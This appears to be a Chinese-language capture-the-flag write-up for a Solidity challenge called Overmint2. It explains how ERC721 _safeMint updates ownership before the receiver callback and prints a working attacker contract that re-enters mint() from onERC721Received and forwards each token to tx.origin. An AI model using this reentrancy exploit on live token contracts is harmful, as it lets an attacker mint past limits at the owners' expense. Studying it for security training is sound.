这道题有两个点需要注意一下，比较重要的就是合约在创建的时候，代码是不在链上的，所以没办法直接回调，所以只能再部署一个合约来去操作

```solidity
    function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory data
    ) internal virtual {
        _mint(to, tokenId);  //line1
        require(
            _checkOnERC721Received(address(0), to, tokenId, data),  //line2
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }
    
    function _mint(address to, uint256 tokenId) internal virtual {
        require(to != address(0), "ERC721: mint to the zero address");
        require(!_exists(tokenId), "ERC721: token already minted");

        _beforeTokenTransfer(address(0), to, tokenId);

        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(address(0), to, tokenId);

        _afterTokenTransfer(address(0), to, tokenId);
    }
```

另外一个点就是\_safeMint调用\_mint，\_mint中就先进行的balance的增减(line1)，后require(line2)，所以就有可乘之机了

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint2.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Attacker {
    constructor(address addr) {
        A a = new A(addr);
        a.attack();
    }
}

contract A is IERC721Receiver {
    Overmint2 public victim;

    constructor(address addr) {
        victim = Overmint2(addr);
    }

    function onERC721Received(
        address sender,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        victim.transferFrom(address(this), tx.origin, tokenId);

        if (tokenId < 5) {
            victim.mint();
        }

        return this.onERC721Received.selector;
    }

    function attack() external {
        // count++;
        victim.mint();
    }
}

```

因为所以我们在onERC721Received回调中把偷来的token转移给自己，否则在之后的require就会revert



